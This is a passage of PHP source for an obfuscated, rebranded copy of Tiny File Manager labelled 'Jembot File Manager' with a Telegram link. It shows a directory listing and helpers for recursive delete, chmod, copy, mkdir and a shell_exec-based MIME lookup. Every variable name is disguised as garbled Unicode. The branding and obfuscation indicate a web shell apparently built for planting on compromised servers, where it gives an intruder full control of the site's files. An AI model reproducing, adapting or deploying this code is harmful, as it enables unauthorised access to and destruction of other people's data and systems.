echo ($ο»Ό†ΈΌΏγ‰ & 00010) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="ox" value="1" <?php 
echo ($ο»Ό†ΈΌΏγ‰ & 00001) ? ' checked' : '' ?>></label></td>
                        </tr>
                    </table>

                    <p>
                        <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                        <b><a href="?p=<?php 
echo urlencode(FM_PATH) ?>" class="btn btn-outline-primary"><i class="fa fa-times-circle"></i> <?php 
echo lng('Cancel') ?></a></b>&nbsp;
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php 
echo lng('Change') ?></button>
                    </p>
                </form>
            </div>
        </div>
    </div>
<?php

    fm_show_footer();
    exit;
}

// --- TINYFILEMANAGER MAIN ---
fm_show_header(); // HEADER
fm_show_nav_path(FM_PATH); // current path

// show alert messages
fm_show_message();

$ογγγΌΌγ―„γγγ‚γγ = count($ο‚γΌγγγ»‚γ‰Όγ‚);
$γ»„γογ†ογγ‚γ‚ = count($γ“γΈγγ„γ‚γο­);
$‚„γγΌΌ„Όγ‚Όγ‚Έ = 0;
?>
<form action="" method="post" class="pt-3">
    <input type="hidden" name="p" value="<?php 
echo fm_enc(FM_PATH) ?>">
    <input type="hidden" name="group" value="1">
    <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
    <div class="table-responsive">
        <table class="table table-bordered table-hover table-sm" id="main-table" data-bs-theme="<?php 
echo FM_THEME; ?>">
            <thead class="thead-white">
                <tr>
                    <?php 
if (!FM_READONLY): ?>
                        <th style="width:3%" class="custom-checkbox-header">
                            <div class="custom-control custom-checkbox">
                                <input type="checkbox" class="custom-control-input" id="js-select-all-items" onclick="checkbox_toggle()">
                                <label class="custom-control-label" for="js-select-all-items"></label>
                            </div>
                        </th><?php 
endif; ?>
                    <th><?php 
echo lng('Name') ?></th>
                    <th><?php 
echo lng('Size') ?></th>
                    <th><?php 
echo lng('Modified') ?></th>
                    <?php 
if (!FM_IS_WIN && !$Όγγο“„γ²γΌ†γ†γγγγ): ?>
                        <th><?php 
echo lng('Perms') ?></th>
                        <th><?php 
echo lng('Owner') ?></th><?php 
endif; ?>
                    <th><?php 
echo lng('Actions') ?></th>
                </tr>
            </thead>
            <?php

            // link to parent folder
            if ($γ†‚γΌ«γγγγγ !== false) {
            ?>
                <tr><?php 
if (!FM_READONLY): ?>
                        <td class="nosort"></td><?php 
endif; ?>
                    <td class="border-0" data-sort><a href="?p=<?php 
echo urlencode($γ†‚γΌ«γγγγγ) ?>"><i class="fa fa-chevron-circle-left go-back"></i> ..</a></td>
                    <td class="border-0" data-order></td>
                    <td class="border-0" data-order></td>
                    <td class="border-0"></td>
                    <?php 
if (!FM_IS_WIN && !$Όγγο“„γ²γΌ†γ†γγγγ) { ?>
                        <td class="border-0"></td>
                        <td class="border-0"></td>
                    <?php 
} ?>
                </tr>
            <?php

            }
            $‚‚γ‹‰γ“ογογ = 3399;
            foreach ($γ“γΈγγ„γ‚γο­ as $ογ‚γγµγογογΌγ») {
                $«‚„²•‰γ“‚γγγ = is_link($γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚γγµγογογΌγ»);
                $γ„²²γ‚γ„ = $«‚„²•‰γ“‚γγγ ? 'icon-link_folder' : 'fa fa-folder-o';
                $‚γγ‚γ™γ»γγγγ„ = filemtime($γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚γγµγογογΌγ»);
                $‰γγ‚Ώγ™²«ο»†γ = date(FM_DATETIME_FORMAT, $‚γγ‚γ™γ»γγγγ„);
                $Ό†γ‰‰γογγγ¦² = strtotime(date("F d Y H:i:s.", $‚γγ‚γ™γ»γγγγ„));
                $γγΌΌγ‚Έ­γ‚ΌΏ = "";
                $γΌ„„γ»γ‰‚γογ‰Ύ‰ = lng('Folder');
                $†‚γγγ²‰γΈγγγΎγ² = substr(decoct(fileperms($γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚γγµγογογΌγ»)), -4);
                if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
                    $Ώ²γµ‚γ‚γγ = posix_getpwuid(fileowner($γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚γγµγογογΌγ»));
                    $“γγΌγγγγγγγ„γ„ = posix_getgrgid(filegroup($γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚γγµγογογΌγ»));
                    if ($Ώ²γµ‚γ‚γγ === false) {
                        $Ώ²γµ‚γ‚γγ = array('name' => '?');
                    }
                    if ($“γγΌγγγγγγγ„γ„ === false) {
                        $“γγΌγγγγγγγ„γ„ = array('name' => '?');
                    }
                } else {
                    $Ώ²γµ‚γ‚γγ = array('name' => '?');
                    $“γγΌγγγγγγγ„γ„ = array('name' => '?');
                }
            ?>
                <tr>
                    <?php 
if (!FM_READONLY): ?>
                        <td class="custom-checkbox-td">
                            <div class="custom-control custom-checkbox">
                                <input type="checkbox" class="custom-control-input" id="<?php 
echo $‚‚γ‹‰γ“ογογ ?>" name="file[]" value="<?php 
echo fm_enc($ογ‚γγµγογογΌγ») ?>">
                                <label class="custom-control-label" for="<?php 
echo $‚‚γ‹‰γ“ογογ ?>"></label>
                            </div>
                        </td>
                    <?php 
endif; ?>
                    <td data-sort=<?php 
echo fm_convert_win(fm_enc($ογ‚γγµγογογΌγ»)) ?>>
                        <div class="filename">
                            <a href="?p=<?php 
echo urlencode(trim(FM_PATH . '/' . $ογ‚γγµγογογΌγ», '/')) ?>"><i class="<?php 
echo $γ„²²γ‚γ„ ?>"></i> <?php 
echo fm_convert_win(fm_enc($ογ‚γγµγογογΌγ»)) ?></a>
                            <?php 
echo ($«‚„²•‰γ“‚γγγ ? ' &rarr; <i>' . readlink($γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚γγµγογογΌγ») . '</i>' : '') ?>
                        </div>
                    </td>
                    <td data-order="a-<?php 
echo str_pad($γγΌΌγ‚Έ­γ‚ΌΏ, 18, "0", STR_PAD_LEFT); ?>">
                        <?php 
echo $γΌ„„γ»γ‰‚γογ‰Ύ‰; ?>
                    </td>
                    <td data-order="a-<?php 
echo $Ό†γ‰‰γογγγ¦²; ?>"><?php 
echo $‰γγ‚Ώγ™²«ο»†γ ?></td>
                    <?php 
if (!FM_IS_WIN && !$Όγγο“„γ²γΌ†γ†γγγγ): ?>
                        <td>
                            <?php 
if (!FM_READONLY): ?><a title="Change Permissions" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;chmod=<?php 
echo urlencode($ογ‚γγµγογογΌγ») ?>"><?php 
echo $†‚γγγ²‰γΈγγγΎγ² ?></a><?php 
else: ?><?php 
echo $†‚γγγ²‰γΈγγγΎγ² ?><?php 
endif; ?>
                        </td>
                        <td>
                            <?php 
echo $Ώ²γµ‚γ‚γγ['name'] . ':' . $“γγΌγγγγγγγ„γ„['name'] ?>
                        </td>
                    <?php 
endif; ?>
                    <td class="inline-actions"><?php 
if (!FM_READONLY): ?>
                            <a title="<?php 
echo lng('Delete') ?>" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;del=<?php 
echo urlencode($ογ‚γγµγογογΌγ») ?>" onclick="confirmDailog(event, '1028','<?php 
echo lng('Delete') . ' ' . lng('Folder'); ?>','<?php 
echo urlencode($ογ‚γγµγογογΌγ») ?>', this.href);"> <i class="fa fa-trash-o" aria-hidden="true"></i></a>
                            <a title="<?php 
echo lng('Rename') ?>" href="#" onclick="rename('<?php 
echo fm_enc(addslashes(FM_PATH)) ?>', '<?php 
echo fm_enc(addslashes($ογ‚γγµγογογΌγ»)) ?>');return false;"><i class="fa fa-pencil-square-o" aria-hidden="true"></i></a>
                            <a title="<?php 
echo lng('CopyTo') ?>..." href="?p=&amp;copy=<?php 
echo urlencode(trim(FM_PATH . '/' . $ογ‚γγµγογογΌγ», '/')) ?>"><i class="fa fa-files-o" aria-hidden="true"></i></a>
                        <?php 
endif; ?>
                        <a title="<?php 
echo lng('DirectLink') ?>" href="<?php 
echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $ογ‚γγµγογογΌγ» . '/') ?>" target="_blank"><i class="fa fa-link" aria-hidden="true"></i></a>
                    </td>
                </tr>
            <?php

                flush();
                $‚‚γ‹‰γ“ογογ++;
            }
            $γοµγγ‹Όγ™Όγ‰ = 8002;
            foreach ($ο‚γΌγγγ»‚γ‰Όγ‚ as $ογ‚γγµγογογΌγ») {
                $«‚„²•‰γ“‚γγγ = is_link($γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚γγµγογογΌγ»);
                $γ„²²γ‚γ„ = $«‚„²•‰γ“‚γγγ ? 'fa fa-file-text-o' : fm_get_file_icon_class($γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚γγµγογογΌγ»);
                $‚γγ‚γ™γ»γγγγ„ = filemtime($γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚γγµγογογΌγ»);
                $‰γγ‚Ώγ™²«ο»†γ = date(FM_DATETIME_FORMAT, $‚γγ‚γ™γ»γγγγ„);
                $Ό†γ‰‰γογγγ¦² = strtotime(date("F d Y H:i:s.", $‚γγ‚γ™γ»γγγγ„));
                $γγΌΌγ‚Έ­γ‚ΌΏ = fm_get_size($γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚γγµγογογΌγ»);
                $γΌ„„γ»γ‰‚γογ‰Ύ‰ = fm_get_filesize($γγΌΌγ‚Έ­γ‚ΌΏ);
                $γγογ‚γ²•‰γγγγο = '?p=' . urlencode(FM_PATH) . '&amp;view=' . urlencode($ογ‚γγµγογογΌγ»);
                $‚„γγΌΌ„Όγ‚Όγ‚Έ += $γγΌΌγ‚Έ­γ‚ΌΏ;
                $†‚γγγ²‰γΈγγγΎγ² = substr(decoct(fileperms($γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚γγµγογογΌγ»)), -4);
                if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
                    $Ώ²γµ‚γ‚γγ = posix_getpwuid(fileowner($γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚γγµγογογΌγ»));
                    $“γγΌγγγγγγγ„γ„ = posix_getgrgid(filegroup($γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚γγµγογογΌγ»));
                    if ($Ώ²γµ‚γ‚γγ === false) {
                        $Ώ²γµ‚γ‚γγ = array('name' => '?');
                    }
                    if ($“γγΌγγγγγγγ„γ„ === false) {
                        $“γγΌγγγγγγγ„γ„ = array('name' => '?');
                    }
                } else {
                    $Ώ²γµ‚γ‚γγ = array('name' => '?');
                    $“γγΌγγγγγγγ„γ„ = array('name' => '?');
                }
            ?>
                <tr>
                    <?php 
if (!FM_READONLY): ?>
                        <td class="custom-checkbox-td">
                            <div class="custom-control custom-checkbox">
                                <input type="checkbox" class="custom-control-input" id="<?php 
echo $γοµγγ‹Όγ™Όγ‰ ?>" name="file[]" value="<?php 
echo fm_enc($ογ‚γγµγογογΌγ») ?>">
                                <label class="custom-control-label" for="<?php 
echo $γοµγγ‹Όγ™Όγ‰ ?>"></label>
                            </div>
                        </td><?php 
endif; ?>
                    <td data-sort=<?php 
echo fm_enc($ογ‚γγµγογογΌγ») ?>>
                        <div class="filename">
                            <?php

                            if (in_array(strtolower(pathinfo($ογ‚γγµγογογΌγ», PATHINFO_EXTENSION)), array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'ico', 'svg', 'webp', 'avif'))): ?>
                                <?php 
$γ‚ΌγγΌοο‰»γγγ« = fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $ογ‚γγµγογογΌγ»); ?>
                                <a href="<?php 
echo $γγογ‚γ²•‰γγγγο ?>" data-preview-image="<?php 
echo $γ‚ΌγγΌοο‰»γγγ« ?>" title="<?php 
echo fm_enc($ογ‚γγµγογογΌγ») ?>">
                                <?php 
else: ?>
                                    <a href="<?php 
echo $γγογ‚γ²•‰γγγγο ?>" title="<?php 
echo $ογ‚γγµγογογΌγ» ?>">
                                    <?php 
endif; ?>
                                    <i class="<?php 
echo $γ„²²γ‚γ„ ?>"></i> <?php 
echo fm_convert_win(fm_enc($ογ‚γγµγογογΌγ»)) ?>
                                    </a>
                                    <?php 
echo ($«‚„²•‰γ“‚γγγ ? ' &rarr; <i>' . readlink($γΌγ‚²γγοΌΌγ„²«„ . '/' . $ογ‚γγµγογογΌγ») . '</i>' : '') ?>
                        </div>
                    </td>
                    <td data-order="b-<?php 
echo str_pad($γγΌΌγ‚Έ­γ‚ΌΏ, 18, "0", STR_PAD_LEFT); ?>"><span title="<?php 
printf('%s bytes', $γγΌΌγ‚Έ­γ‚ΌΏ) ?>">
                            <?php 
echo $γΌ„„γ»γ‰‚γογ‰Ύ‰; ?>
                        </span></td>
                    <td data-order="b-<?php 
echo $Ό†γ‰‰γογγγ¦²; ?>"><?php 
echo $‰γγ‚Ώγ™²«ο»†γ ?></td>
                    <?php 
if (!FM_IS_WIN && !$Όγγο“„γ²γΌ†γ†γγγγ): ?>
                        <td><?php 
if (!FM_READONLY): ?><a title="<?php 
echo 'Change Permissions' ?>" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;chmod=<?php 
echo urlencode($ογ‚γγµγογογΌγ») ?>"><?php 
echo $†‚γγγ²‰γΈγγγΎγ² ?></a><?php 
else: ?><?php 
echo $†‚γγγ²‰γΈγγγΎγ² ?><?php 
endif; ?>
                        </td>
                        <td><?php 
echo fm_enc($Ώ²γµ‚γ‚γγ['name'] . ':' . $“γγΌγγγγγγγ„γ„['name']) ?></td>
                    <?php 
endif; ?>
                    <td class="inline-actions">
                        <?php 
if (!FM_READONLY): ?>
                            <a title="<?php 
echo lng('Delete') ?>" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;del=<?php 
echo urlencode($ογ‚γγµγογογΌγ») ?>" onclick="confirmDailog(event, 1209, '<?php 
echo lng('Delete') . ' ' . lng('File'); ?>','<?php 
echo urlencode($ογ‚γγµγογογΌγ»); ?>', this.href);"> <i class="fa fa-trash-o"></i></a>
                            <a title="<?php 
echo lng('Rename') ?>" href="#" onclick="rename('<?php 
echo fm_enc(addslashes(FM_PATH)) ?>', '<?php 
echo fm_enc(addslashes($ογ‚γγµγογογΌγ»)) ?>');return false;"><i class="fa fa-pencil-square-o"></i></a>
                            <a title="<?php 
echo lng('CopyTo') ?>..."
                                href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;copy=<?php 
echo urlencode(trim(FM_PATH . '/' . $ογ‚γγµγογογΌγ», '/')) ?>"><i class="fa fa-files-o"></i></a>
                        <?php 
endif; ?>
                        <a title="<?php 
echo lng('DirectLink') ?>" href="<?php 
echo fm_enc(FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $ογ‚γγµγογογΌγ») ?>" target="_blank"><i class="fa fa-link"></i></a>
                        <a title="<?php 
echo lng('Download') ?>" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;dl=<?php 
echo urlencode($ογ‚γγµγογογΌγ») ?>" onclick="confirmDailog(event, 1211, '<?php 
echo lng('Download'); ?>','<?php 
echo urlencode($ογ‚γγµγογογΌγ»); ?>', this.href);"><i class="fa fa-download"></i></a>
                    </td>
                </tr>
            <?php

                flush();
                $γοµγγ‹Όγ™Όγ‰++;
            }

            if (empty($γ“γΈγγ„γ‚γο­) && empty($ο‚γΌγγγ»‚γ‰Όγ‚)) { ?>
                <tfoot>
                    <tr><?php 
if (!FM_READONLY): ?>
                            <td></td><?php 
endif; ?>
                        <td colspan="<?php 
echo (!FM_IS_WIN && !$Όγγο“„γ²γΌ†γ†γγγγ) ? '6' : '4' ?>"><em><?php 
echo lng('Folder is empty') ?></em></td>
                    </tr>
                </tfoot>
            <?php

            } else { ?>
                <tfoot>
                    <tr>
                        <td class="gray fs-7" colspan="<?php 
echo (!FM_IS_WIN && !$Όγγο“„γ²γΌ†γ†γγγγ) ? (FM_READONLY ? '6' : '7') : (FM_READONLY ? '4' : '5') ?>">
                            <?php 
echo lng('FullSize') . ': <span class="badge text-bg-light border-radius-0">' . fm_get_filesize($‚„γγΌΌ„Όγ‚Όγ‚Έ) . '</span>' ?>
                            <?php 
echo lng('File') . ': <span class="badge text-bg-light border-radius-0">' . $ογγγΌΌγ―„γγγ‚γγ . '</span>' ?>
                            <?php 
echo lng('Folder') . ': <span class="badge text-bg-light border-radius-0">' . $γ»„γογ†ογγ‚γ‚ . '</span>' ?>
                        </td>
                    </tr>
                </tfoot>
            <?php 
} ?>
        </table>
    </div>

    <div class="row">
        <?php 
if (!FM_READONLY): ?>
            <div class="col-xs-12 col-sm-9">
                <div class="btn-group flex-wrap" data-toggle="buttons" role="toolbar">
                    <a href="#/select-all" class="btn btn-small btn-outline-primary btn-2" onclick="select_all();return false;"><i class="fa fa-check-square"></i> <?php 
echo lng('SelectAll') ?> </a>
                    <a href="#/unselect-all" class="btn btn-small btn-outline-primary btn-2" onclick="unselect_all();return false;"><i class="fa fa-window-close"></i> <?php 
echo lng('UnSelectAll') ?> </a>
                    <a href="#/invert-all" class="btn btn-small btn-outline-primary btn-2" onclick="invert_all();return false;"><i class="fa fa-th-list"></i> <?php 
echo lng('InvertSelection') ?> </a>
                    <input type="submit" class="hidden" name="delete" id="a-delete" value="Delete" onclick="return confirm('<?php 
echo lng('Delete selected files and folders?'); ?>')">
                    <a href="javascript:document.getElementById('a-delete').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-trash"></i> <?php 
echo lng('Delete') ?> </a>
                    <input type="submit" class="hidden" name="zip" id="a-zip" value="zip" onclick="return confirm('<?php 
echo lng('Create archive?'); ?>')">
                    <a href="javascript:document.getElementById('a-zip').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php 
echo lng('Zip') ?> </a>
                    <input type="submit" class="hidden" name="tar" id="a-tar" value="tar" onclick="return confirm('<?php 
echo lng('Create archive?'); ?>')">
                    <a href="javascript:document.getElementById('a-tar').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php 
echo lng('Tar') ?> </a>
                    <input type="submit" class="hidden" name="copy" id="a-copy" value="Copy">
                    <a href="javascript:document.getElementById('a-copy').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-files-o"></i> <?php 
echo lng('Copy') ?> </a>
                </div>
            </div>
            <div class="col-3 d-none d-sm-block"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">jembot File Manager <?php 
echo VERSION; ?></a></div>
        <?php 
else: ?>
            <div class="col-12"><a href="https://t.me/ISC2k17" target="_blank" class="float-right text-muted">Jembot File Manager <?php 
echo VERSION; ?></a></div>
        <?php 
endif; ?>
    </div>
</form>

<?php

fm_show_footer();

// --- END HTML ---

// Functions

/**
 * It prints the css/js files into html
 * @param key The key of the external file to print.
 */
function print_external($γγΌΈΌ—ογΌ‚γ¦‰γ‰γ)
{
    global $²Έγ»γγογΏγ;

    if (!array_key_exists($γγΌΈΌ—ογΌ‚γ¦‰γ‰γ, $²Έγ»γγογΏγ)) {
        // throw new Exception('Key missing in external: ' . key);
        echo "<!-- EXTERNAL: MISSING KEY $γγΌΈΌ—ογΌ‚γ¦‰γ‰γ -->";
        return;
    }

    echo "$²Έγ»γγογΏγ[$γγΌΈΌ—ογΌ‚γ¦‰γ‰γ]";
}

/**
 * Verify CSRF TOKEN and remove after certified
 * @param string $token
 * @return bool
 */
function verifyToken($‚‚γγ‰γγγ‚‚ο‚•γ)
{
    if (hash_equals($_SESSION['token'], $‚‚γγ‰γγγ‚‚ο‚•γ)) {
        return true;
    }
    return false;
}

/**
 * Delete  file or folder (recursively)
 * @param string $path
 * @return bool
 */
function fm_rdelete($γΌγ‚²γγοΌΌγ„²«„)
{
    if (is_link($γΌγ‚²γγοΌΌγ„²«„)) {
        return unlink($γΌγ‚²γγοΌΌγ„²«„);
    } elseif (is_dir($γΌγ‚²γγοΌΌγ„²«„)) {
        $γγ‚“‰γ‚„‚™γγΏγ = scandir($γΌγ‚²γγοΌΌγ„²«„);
        $γγογΏ‰γγ»―Όο‚γο„Ό = true;
        if (is_array($γγ‚“‰γ‚„‚™γγΏγ)) {
            foreach ($γγ‚“‰γ‚„‚™γγΏγ as $γ»γγµ™„‚‚γ) {
                if ($γ»γγµ™„‚‚γ != '.' && $γ»γγµ™„‚‚γ != '..') {
                    if (!fm_rdelete($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ)) {
                        $γγογΏ‰γγ»―Όο‚γο„Ό = false;
                    }
                }
            }
        }
        return ($γγογΏ‰γγ»―Όο‚γο„Ό) ? rmdir($γΌγ‚²γγοΌΌγ„²«„) : false;
    } elseif (is_file($γΌγ‚²γγοΌΌγ„²«„)) {
        return unlink($γΌγ‚²γγοΌΌγ„²«„);
    }
    return false;
}

/**
 * Recursive chmod
 * @param string $path
 * @param int $filemode
 * @param int $dirmode
 * @return bool
 * @todo Will use in mass chmod
 */
function fm_rchmod($γΌγ‚²γγοΌΌγ„²«„, $γγγ®ογΌο―γ‰Όγ, $γ‚γγ―γγ“Ώ²γΏ•γΏο)
{
    if (is_dir($γΌγ‚²γγοΌΌγ„²«„)) {
        if (!chmod($γΌγ‚²γγοΌΌγ„²«„, $γ‚γγ―γγ“Ώ²γΏ•γΏο)) {
            return false;
        }
        $γγ‚“‰γ‚„‚™γγΏγ = scandir($γΌγ‚²γγοΌΌγ„²«„);
        if (is_array($γγ‚“‰γ‚„‚™γγΏγ)) {
            foreach ($γγ‚“‰γ‚„‚™γγΏγ as $γ»γγµ™„‚‚γ) {
                if ($γ»γγµ™„‚‚γ != '.' && $γ»γγµ™„‚‚γ != '..') {
                    if (!fm_rchmod($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ, $γγγ®ογΌο―γ‰Όγ, $γ‚γγ―γγ“Ώ²γΏ•γΏο)) {
                        return false;
                    }
                }
            }
        }
        return true;
    } elseif (is_link($γΌγ‚²γγοΌΌγ„²«„)) {
        return true;
    } elseif (is_file($γΌγ‚²γγοΌΌγ„²«„)) {
        return chmod($γΌγ‚²γγοΌΌγ„²«„, $γγγ®ογΌο―γ‰Όγ);
    }
    return false;
}

/**
 * Check the file extension which is allowed or not
 * @param string $filename
 * @return bool
 */
function fm_is_valid_ext($γµΌ„γγγογ²“‚‰»ΌΌ)
{
    $γ‚ο™‚ογΏγογγογ“γ = (FM_FILE_EXTENSION) ? explode(',', FM_FILE_EXTENSION) : false;

    $γγγ‚‚‚γ«‚γ‰‰Όγο = pathinfo($γµΌ„γγγογ²“‚‰»ΌΌ, PATHINFO_EXTENSION);
    $ο•γγογΌγγγγγ‚ο = ($γ‚ο™‚ογΏγογγογ“γ) ? in_array($γγγ‚‚‚γ«‚γ‰‰Όγο, $γ‚ο™‚ογΏγογγογ“γ) : true;

    return ($ο•γγογΌγγγγγ‚ο) ? true : false;
}

/**
 * Safely rename
 * @param string $old
 * @param string $new
 * @return bool|null
 */
function fm_rename($γ―Όγγ‚«“™¦µ‰γγ, $„‚γΎ‚γ‚Όγγ²γ)
{
    $ο•γγογΌγγγγγ‚ο = fm_is_valid_ext($„‚γΎ‚γ‚Όγγ²γ);

    if (!is_dir($γ―Όγγ‚«“™¦µ‰γγ)) {
        if (!$ο•γγογΌγγγγγ‚ο) return false;
    }

    return (!file_exists($„‚γΎ‚γ‚Όγγ²γ) && file_exists($γ―Όγγ‚«“™¦µ‰γγ)) ? rename($γ―Όγγ‚«“™¦µ‰γγ, $„‚γΎ‚γ‚Όγγ²γ) : null;
}

/**
 * Copy file or folder (recursively).
 * @param string $path
 * @param string $dest
 * @param bool $upd Update files
 * @param bool $force Create folder with same names instead file
 * @return bool
 */
function fm_rcopy($γΌγ‚²γγοΌΌγ„²«„, $»»γΌ‚†²Όγ‚―Ύογ, $††ΎγγγοΈ¬«‚‚γ = true, $γγγγ‰†γ„‚—‚ = true)
{
    if (!is_dir($γΌγ‚²γγοΌΌγ„²«„) && !is_file($γΌγ‚²γγοΌΌγ„²«„)) {
        return false;
    }

    if (is_dir($γΌγ‚²γγοΌΌγ„²«„)) {
        if (!fm_mkdir($»»γΌ‚†²Όγ‚―Ύογ, $γγγγ‰†γ„‚—‚)) {
            return false;
        }

        $γγ‚“‰γ‚„‚™γγΏγ = array_diff(scandir($γΌγ‚²γγοΌΌγ„²«„), ['.', '..']);

        foreach ($γγ‚“‰γ‚„‚™γγΏγ as $γ»γγµ™„‚‚γ) {
            if (!fm_rcopy("$γΌγ‚²γγοΌΌγ„²«„/$γ»γγµ™„‚‚γ", "$»»γΌ‚†²Όγ‚―Ύογ/$γ»γγµ™„‚‚γ", $††ΎγγγοΈ¬«‚‚γ, $γγγγ‰†γ„‚—‚)) {
                return false;
            }
        }

        return true;
    }

    // Handle file copying
    return fm_copy($γΌγ‚²γγοΌΌγ„²«„, $»»γΌ‚†²Όγ‚―Ύογ, $††ΎγγγοΈ¬«‚‚γ);
}


/**
 * Safely create folder
 * @param string $dir
 * @param bool $force
 * @return bool
 */
function fm_mkdir($γγ‹­γ‰γγγγΌ»γγ‰, $γγγγ‰†γ„‚—‚)
{
    if (file_exists($γγ‹­γ‰γγγγΌ»γγ‰)) {
        if (is_dir($γγ‹­γ‰γγγγΌ»γγ‰)) {
            return $γγ‹­γ‰γγγγΌ»γγ‰;
        } elseif (!$γγγγ‰†γ„‚—‚) {
            return false;
        }
        unlink($γγ‹­γ‰γγγγΌ»γγ‰);
    }
    return mkdir($γγ‹­γ‰γγγγΌ»γγ‰, 0777, true);
}

/**
 * Safely copy file
 * @param string $f1
 * @param string $f2
 * @param bool $upd Indicates if file should be updated with new content
 * @return bool
 */
function fm_copy($Ό¬Όγγγ™„γγγγ‚γγγΏο, $γ™‚γγ®γγ„οΌ†‚γ, $††ΎγγγοΈ¬«‚‚γ)
{
    $—‰Όγ‚γγ»™γγ‚ = filemtime($Ό¬Όγγγ™„γγγγ‚γγγΏο);
    if (file_exists($γ™‚γγ®γγ„οΌ†‚γ)) {
        $―Όο²γγο»™ο²‚γ•ο = filemtime($γ™‚γγ®γγ„οΌ†‚γ);
        if ($―Όο²γγο»™ο²‚γ•ο >= $—‰Όγ‚γγ»™γγ‚ && $††ΎγγγοΈ¬«‚‚γ) {
            return false;
        }
    }
    $γγογΏ‰γγ»―Όο‚γο„Ό = copy($Ό¬Όγγγ™„γγγγ‚γγγΏο, $γ™‚γγ®γγ„οΌ†‚γ);
    if ($γγογΏ‰γγ»―Όο‚γο„Ό) {
        touch($γ™‚γγ®γγ„οΌ†‚γ, $—‰Όγ‚γγ»™γγ‚);
    }
    return $γγογΏ‰γγ»―Όο‚γο„Ό;
}

/**
 * Get mime type
 * @param string $file_path
 * @return mixed|string
 */
function fm_get_mime_type($―γ»γγ»®‚γγΌογ)
{
    if (function_exists('finfo_open')) {
        $γΌγγµ•γγγ»™•²Ό = finfo_open(FILEINFO_MIME_TYPE);
        $ΌΏγγ‚¦γ­«‚γγγγ‚ = finfo_file($γΌγγµ•γγγ»™•²Ό, $―γ»γγ»®‚γγΌογ);
        finfo_close($γΌγγµ•γγγ»™•²Ό);
        return $ΌΏγγ‚¦γ­«‚γγγγ‚;
    } elseif (function_exists('mime_content_type')) {
        return mime_content_type($―γ»γγ»®‚γγΌογ);
    } elseif (!stristr(ini_get('disable_functions'), 'shell_exec')) {
        $γ»γγµ™„‚‚γ = escapeshellarg($―γ»γγ»®‚γγΌογ);
        $ΌΏγγ‚¦γ­«‚γγγγ‚ = shell_exec('file -bi ' . $γ»γγµ™„‚‚γ);
        return $ΌΏγγ‚¦γ­«‚γγγγ‚;
    } else {
        return '--';
    }
}

/**
 * HTTP Redirect
 * @param string $url
 * @param int $code
 */
function fm_redirect($γγ‚•ΈΌΌ­γγγγγ, $ΌΌογο‰γ‚γ¦Ώ = 302)
{
    header('Location: ' . $γγ‚•ΈΌΌ­γγγγγ, true, $ΌΌογο‰γ‚γ¦Ώ);
    exit;
}

/**
 * Path traversal prevention and clean the url
 * It replaces (consecutive) occurrences of / and \\ with whatever is in DIRECTORY_SEPARATOR, and processes /. and /.. fine.
 * @param $path
 * @return string
 */
function get_absolute_path($γΌγ‚²γγοΌΌγ„²«„)
{
    $γΌγ‚²γγοΌΌγ„²«„ = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $γΌγ‚²γγοΌΌγ„²«„);
    $Όγ¦ογµο²„γ„‚γ = array_filter(explode(DIRECTORY_SEPARATOR, $γΌγ‚²γγοΌΌγ„²«„), 'strlen');
    $‰γΌΌ†Ώο»Ό‚γ• = array();
    foreach ($Όγ¦ογµο²„γ„‚γ as $Όγ†γγογγ²„γ) {
        if ('.' == $Όγ†γγογγ²„γ) continue;
        if ('..' == $Όγ†γγογγ²„γ) {
            array_pop($‰γΌΌ†Ώο»Ό‚γ•);
        } else {
            $‰γΌΌ†Ώο»Ό‚γ•[] = $Όγ†γγογγ²„γ;
        }
    }
    return implode(DIRECTORY_SEPARATOR, $‰γΌΌ†Ώο»Ό‚γ•);
}

/**
 * Clean path
 * @param string $path
 * @return string
 */
function fm_clean_path($γΌγ‚²γγοΌΌγ„²«„, $ΈγγοΌ²²οο‚†‚γΏο‚ = true)
{
    $γΌγ‚²γγοΌΌγ„²«„ = $ΈγγοΌ²²οο‚†‚γΏο‚ ? trim($γΌγ‚²γγοΌΌγ„²«„) : $γΌγ‚²γγοΌΌγ„²«„;
    $γΌγ‚²γγοΌΌγ„²«„ = trim($γΌγ‚²γγοΌΌγ„²«„, '\\/');
